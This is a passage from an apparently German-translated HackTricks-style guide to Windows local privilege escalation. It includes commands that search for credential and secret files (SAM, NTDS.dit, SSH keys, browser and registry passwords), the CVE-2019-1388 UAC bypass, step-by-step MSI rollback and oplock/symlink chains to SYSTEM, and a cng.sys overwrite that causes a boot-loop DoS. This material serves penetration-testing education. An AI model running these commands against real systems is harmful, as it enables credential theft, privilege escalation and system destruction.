dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Sie sollten außerdem den Bin überprüfen, um darin nach credentials zu suchen

Um mit mehreren Programmen gespeicherte **Passwörter wiederherzustellen** können Sie Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Sie sollten nach dbs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Prüfen Sie außerdem den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter** gespeichert sind.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine im Windows-Betriebssystem integrierte Technologie, die die **Interkommunikation** zwischen Softwarekomponenten in verschiedenen Sprachen ermöglicht. Jede COM-Komponente wird über eine Klassen-ID (CLSID) **identifiziert**, und jede Komponente stellt Funktionalität über eine oder mehrere Schnittstellen bereit, die durch Interface-IDs (IIDs) gekennzeichnet sind.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Innerhalb der CLSIDs in dieser Registry finden Sie den Unterschlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** zeigt, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) oder **Neutral** (Thread Neutral) sein kann.

![](<../../images/image (729).png>)

Grundsätzlich: Wenn Sie eine der auszuführenden **DLLs** überschreiben können, können Sie die Privilegien eskalieren, sofern diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu sehen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generische Passwortsuche in Dateien und Registry**

**Suche nach Dateiinhalten**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suche nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools, die nach passwords suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf** Plugin. Ich habe dieses Plugin erstellt, um **automatisch jedes metasploit POST module auszuführen, das nach credentials sucht** auf dem Zielsystem.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die auf dieser Seite erwähnte passwords enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um password aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **sessions**, **usernames** und **passwords** mehrerer Tools, die diese Daten im clear text speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY, und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stell dir vor, dass **ein Prozess, der als SYSTEM läuft, einen neuen Prozess öffnet** (`OpenProcess()`) mit **full access**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Rechten, der aber alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **full access auf den niedrig privilegierten Prozess** hast, kannst du das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde, übernehmen** und **Shellcode injizieren**.\
[Sieh dir dieses Beispiel für weitere Informationen darüber an, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
[Sieh dir diesen **anderen Beitrag für eine ausführlichere Erklärung an, wie man mehr offene Handler von Prozessen und Threads testet und missbraucht, die mit unterschiedlichen Berechtigungsstufen vererbt werden (nicht nur full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsame Speichersegmente, sogenannte **pipes**, ermöglichen Prozesskommunikation und Datentransfer.

Windows bietet eine Funktion namens **Named Pipes**, die es unabhängigen Prozessen erlaubt, Daten auszutauschen, sogar über verschiedene Netzwerke. Das ähnelt einer Client/Server-Architektur, mit Rollen als **named pipe server** und **named pipe client**.

Wenn Daten durch eine Pipe von einem **client** gesendet werden, kann der **server**, der die Pipe eingerichtet hat, die Identität des **client** annehmen, sofern er die notwendigen **SeImpersonate**-Rechte besitzt. Das Identifizieren eines **privilegierten Prozesses**, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet die Möglichkeit, durch Übernahme der Identität dieses Prozesses höhere Privilegien zu erlangen, sobald er mit der von dir erstellten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem erlaubt folgendes Tool, eine named pipe-Kommunikation mit einem Tool wie burp abzufangen: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) und dieses Tool ermöglicht das Auflisten und Anzeigen aller Pipes, um Privescs zu finden: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Service (TapiSrv) im Server-Modus exponiert `\\pipe\\tapsrv` (MS-TRP). Ein remote authentifizierter Client kann den mailslot-basierten asynchronen Event-Pfad missbrauchen, um `ClientAttach` in einen beliebigen **4-byte write** auf jede vorhandene Datei umzuwandeln, die von `NETWORK SERVICE` beschreibbar ist, anschließend Telephony-Administratorrechte zu erlangen und eine beliebige DLL als Service zu laden. Vollständiger Ablauf:

- `ClientAttach` mit `pszDomainUser` gesetzt auf einen vorhandenen beschreibbaren Pfad → der Service öffnet diesen via `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für asynchrone Event-Schreibvorgänge.
- Jedes Event schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` auf diesen Handle. Registriere eine line app mit `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), hole via `GetAsyncEvents` (`Req_Func 0`), dann unregister/shutdown, um deterministische Writes zu wiederholen.
- Füge dich zu `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` hinzu, reconnecte, rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Mehr Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateiendungen, die in Windows etwas ausführen könnten

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergeleitet werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder beliebige registrierte Schemen) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Überwachung von Command Lines auf Passwörter**

Wenn man eine Shell als ein Benutzer erhält, können geplante Tasks oder andere Prozesse ausgeführt werden, die **Anmeldeinformationen über die Befehlszeile übergeben**. Das unten gezeigte Script erfasst Prozess-Commandlines alle zwei Sekunden und vergleicht den aktuellen Zustand mit dem vorherigen, wobei es eventuelle Unterschiede ausgibt.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stehlen von Passwörtern aus Prozessen

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Oberfläche (via console oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein terminal oder einen beliebigen anderen Prozess wie "NT\AUTHORITY SYSTEM" aus einem unprivilegierten Benutzer auszuführen.

Dies macht es möglich, mit derselben Schwachstelle Privilegien zu eskalieren und UAC gleichzeitig zu umgehen. Zusätzlich ist es nicht nötig, irgendetwas zu installieren, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese vulnerability zu exploit, müssen die folgenden Schritte ausgeführt werden:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Du hast alle notwendigen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388

## Von Administrator Medium zu High Integrity Level / UAC Bypass

Lies dies, um mehr über **Integritätsstufen** zu erfahren:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies dann **dies, um mehr über UAC und UAC bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Von beliebiger Ordnerlöschung/-verschiebung/-umbenennung zu SYSTEM EoP

Die in [**diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem exploit code [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, die Rollback-Funktion des Windows Installer zu missbrauchen, um legitime Dateien während des Deinstallationsprozesses durch bösartige zu ersetzen. Dazu muss der Angreifer ein **bösartiges MSI installer** erstellen, das dazu verwendet wird, den `C:\Config.Msi`-Ordner zu kapern. Dieser Ordner wird später vom Windows Installer verwendet, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei die Rollback-Dateien so geändert werden, dass sie die bösartige Nutzlast enthalten.

Die zusammengefasste Technik ist wie folgt:

1. **Stage 1 – Vorbereitung der Übernahme (lasse `C:\Config.Msi` leer)**

- Step 1: Install the MSI
- Erstelle ein `.msi`, das eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **"UAC Compliant"**, sodass ein **non-admin user** ihn ausführen kann.
- Halte nach der Installation einen **Handle** auf die Datei offen.

- Step 2: Begin Uninstall
- Deinstalliere dasselbe `.msi`.
- Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
- **Poll the open file handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Step 3: Custom Syncing
- Das `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)**, die:
- Signalisiert, wenn `.rbf` geschrieben wurde.
- Dann auf ein anderes Event **wartet**, bevor die Deinstallation fortgesetzt wird.

- Step 4: Block Deletion of `.rbf`
- Wenn signalisiert, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — das **verhindert deren Löschung**.
- Dann **signal zurück**, damit die Deinstallation beendet werden kann.
- Der Windows Installer kann die `.rbf` nicht löschen, und weil er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Step 5: Manually Delete `.rbf`
- Du (Angreifer) löschst die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer**, bereit zur Übernahme.

> An diesem Punkt **trigger the SYSTEM-level arbitrary folder delete vulnerability**, um `C:\Config.Msi` zu löschen.

2. **Stage 2 – Ersetzen der Rollback-Skripte durch bösartige**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Erstelle den `C:\Config.Msi`-Ordner selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F), und **halte einen Handle offen** mit `WRITE_DAC`.

- Step 7: Run Another Install
- Installiere das `.msi` erneut, mit:
- `TARGETDIR`: beschreibbarer Ort.
- `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird erneut verwendet, um einen **rollback** auszulösen, der `.rbs` und `.rbf` liest.

- Step 8: Monitor for `.rbs`
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Erfasse ihren Dateinamen.

- Step 9: Sync Before Rollback
- Das `.msi` enthält eine **custom install action (`SyncBeforeRollback`)**, die:
- Ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- Dann **wartet**, bevor sie fortfährt.

- Step 10: Reapply Weak ACL
- Nach Empfang des `.rbs created`-Events:
- Der Windows Installer **wendet starke ACLs erneut an** auf `C:\Config.Msi`.
- Da du jedoch noch einen Handle mit `WRITE_DAC` hast, kannst du **schwache ACLs erneut anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, daher kannst du weiterhin in den Ordner schreiben.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- Deine `.rbf`-Datei (bösartige DLL) in einen **privilegierten Ort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Deine gefälschte `.rbf` abzulegen, die eine **bösartige SYSTEM-level Payload DLL** enthält.

- Step 12: Trigger the Rollback
- Signalisiere das Sync-Event, damit der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich scheitern** lässt.
- Das verursacht, dass der **Rollback beginnt**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Liest deine bösartige `.rbs`.
- Kopiert deine `.rbf`-DLL in den Zielort.
- Du hast nun deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Final Step: Execute SYSTEM Code
- Führe ein vertrauenswürdiges **auto-elevated binary** aus (z. B. `osk.exe`), das die von dir gehijackte DLL lädt.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von Arbitrary File Delete/Move/Rename zu SYSTEM EoP

Die Haupt-MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Verwundbarkeit nur **arbitrary file deletion** erlaubt?

Du könntest die **NTFS-Interna** ausnutzen: Jeder Ordner hat einen versteckten alternativen Datenstrom namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn Sie also den **`::$INDEX_ALLOCATION`-Stream** eines Ordners löschen, entfernt NTFS den **gesamten Ordner** aus dem Dateisystem.

Das können Sie mit Standard-APIs zum Löschen von Dateien tun, z. B.:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *file* delete API aufrufst, löscht sie **den Ordner selbst**.

### From Folder Contents Delete to SYSTEM EoP
Was, wenn deine primitive es nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber sie **das Löschen der *Inhalte* eines vom Angreifer kontrollierten Ordners erlaubt**?

1. Schritt 1: Richte einen Köder-Ordner und eine Datei ein
- Erstelle: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Setze einen **oplock** auf `file1.txt`
- Der oplock **hält die Ausführung an**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalt zu löschen.
- Wenn es `file1.txt` erreicht, löst der **oplock triggers** aus und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Im oplock-Callback – die Löschung umleiten

- Option A: Verschiebe `file1.txt` an einen anderen Ort
- Das leert `folder1`, ohne den oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde den oplock vorzeitig freigeben.

- Option B: Wandle `folder1` in eine **junction** um:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den NTFS-internen Stream ab, der die Ordner-Metadaten speichert — wenn man ihn löscht, wird der Ordner gelöscht.

5. Schritt 5: oplock freigeben
- Der SYSTEM-Prozess fährt fort und versucht, `file1.txt` zu löschen.
- Aber jetzt, aufgrund der junction + symlink, löscht es tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von Arbitrary Folder Create zu permanentem DoS

Nutze eine Primitive, die es dir ermöglicht, **create an arbitrary folder as SYSTEM/admin** — selbst wenn du **keine Dateien schreiben kannst** oder **keine schwachen Berechtigungen setzen kannst**.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernel-Modus-Treiber `cng.sys`.
- Wenn Sie es **vorab als Ordner anlegen**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Dann versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht auflösen**, und **stürzt ab oder stoppt den Bootvorgang**.
- Es gibt **keinen Fallback**, und **keine Wiederherstellung** ohne externe Intervention (z. B. Boot-Reparatur oder Datenträgerzugriff).

### Von privilegierten Log-/Backup-Pfaden + OM symlinks zu beliebiger Dateiüberschreibung / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exports in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, leiten Sie diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibvorgang in eine beliebige Dateiüberschreibung zu verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).

**Anforderungen**
- Die Konfiguration, die den Zielpfad speichert, ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Fähigkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielablauf**
1. Lese die Konfiguration, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Admin um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte darauf, dass die privilegierte Komponente das Log schreibt (z. B. Admin löst "send test SMS" aus). Der Schreibvorgang landet jetzt in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (hex/PE parser), um die Beschädigung zu bestätigen; ein Reboot zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei verallgemeinern, die ein privilegierter Dienst zum Schreiben öffnen wird.

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **Von High Integrity zu System**

### **Neuer Dienst**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Beim Erstellen einer Service-Binärdatei stelle sicher, dass es ein gültiger Service ist oder dass die Binärdatei die notwendigen Aktionen schnell ausführt, da sie sonst nach 20s beendet wird.

### AlwaysInstallElevated

Von einem Prozess mit High Integrity kannst du versuchen, die AlwaysInstallElevated-Registry-Einträge zu **aktivieren** und eine Reverse-Shell mit einem _**.msi**_ Wrapper **zu installieren**.\
[Mehr Informationen zu den beteiligten Registry-Keys und wie man ein _.msi_ Paket installiert findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Du kannst** [**den Code hier finden**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du diese Token-Privilegien hast (wahrscheinlich findest du diese bereits in einem Prozess mit High Integrity), kannst du fast jeden Prozess (keine protected processes) mit dem SeDebug-Privileg **öffnen**, das **Token kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wählt man üblicherweise **einen Prozess, der als SYSTEM läuft und alle Token-Privilegien hat** (_ja, man kann SYSTEM-Prozesse finden, die nicht alle Token-Privilegien besitzen_).\
**Du findest ein** [**Beispielcode, der die vorgeschlagene Technik ausführt, hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### Named Pipes

Diese Technik wird von meterpreter in `getsystem` verwendet. Die Technik besteht darin, **eine Pipe zu erstellen und dann einen Service zu erstellen/auszunutzen, damit dieser in diese Pipe schreibt**. Danach kann der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privileg erstellt hat, das **Token** des Pipe-Clients (des Services) **imitieren** und so SYSTEM-Privilegien erhalten.\
Wenn du [**mehr über named pipes lernen möchtest, solltest du das hier lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie man von High Integrity zu System mit named pipes gelangt, lies dies**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine **dll zu hijacken**, die von einem **Prozess** ausgeführt als **SYSTEM** geladen wird, kannst du beliebigen Code mit diesen Rechten ausführen. Daher ist Dll Hijacking auch für diese Art der Privilege Escalation nützlich und außerdem **viel einfacher von einem Prozess mit High Integrity zu erreichen**, da dieser **Schreibrechte** auf den Ordnern hat, die zum Laden von DLLs verwendet werden.\
**Du kannst** [**mehr über Dll hijacking hier lernen**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensible Dateien (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf mögliche Fehlkonfigurationen und sammelt Informationen (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Credentials aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprüht gesammelte Passwörter über die Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS Spoofer und Man-in-the-Middle Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende privesc Windows-Enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Checks **(Benötigt Admin-Rechte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (muss mit VisualStudio kompiliert werden) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriert das Host-System und sucht nach Fehlkonfigurationen (mehr ein Info-Gathering-Tool als reines privesc) (muss kompiliert werden) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Credentials aus vielen Programmen (precompiled exe auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (Executable precompiled auf GitHub). Nicht empfohlen. Funktioniert nicht gut unter Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (exe aus python). Nicht empfohlen. Funktioniert nicht gut unter Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool basierend auf diesem Post (benötigt accesschk nicht zwingend, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

